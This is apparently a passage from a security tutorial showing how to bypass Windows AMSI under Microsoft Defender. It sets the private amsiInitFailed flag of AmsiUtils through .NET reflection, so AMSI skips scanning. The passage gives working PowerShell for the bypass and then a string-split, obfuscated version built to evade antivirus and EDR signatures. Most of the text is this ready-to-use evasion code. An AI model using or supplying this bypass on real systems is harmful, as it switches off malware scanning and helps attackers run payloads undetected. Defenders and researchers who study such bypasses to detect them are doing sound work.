### Pratical Example: Memory Patching still effective ?
Let's try to bypass AMSI with a memory patching method. As we saw earlier, this method is sometimes by EDRs or antivrus, and string obfuscation is needed. We'll use an old technique which consists on modifying the internal `amsiInitFailed` flag of the `System.Management.Automation.AmsiUtils` class using .NET reflection, in updated Microsoft Defender.

The `amsiInitFailed` static field in `AmsiUtils` is checked before any AMSI scan operation is invoked. Setting this field to `true` forces AMSI to exit silently without scanning. 

### **Code Example**
The powershell code of this technique is very simple : 
```powershell
# Get the AmsiUtils .NET type
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
# Access the private static field 'amsiInitFailed'
$field = $amsi.GetField('amsiInitFailed', 'NonPublic,Static')
# Set the field to $true to disable AMSI
$field.SetValue($null, $true)
Write-Host "[+] AMSI Bypassed"
```

Let's obfuscate this code :
```powershell
# Deep Obfuscation
$a = [String]::Join('', 'Sy','stem.','Man','agement.Aut','omation.A','msiU','tils')
$b = [String]::Join('', 'am','siIn','itF','ailed')
$t = [Ref].Assembly.GetType($a)
$f = $t.GetField($b, 'NonPublic,Static')
$f.SetValue($null, $true)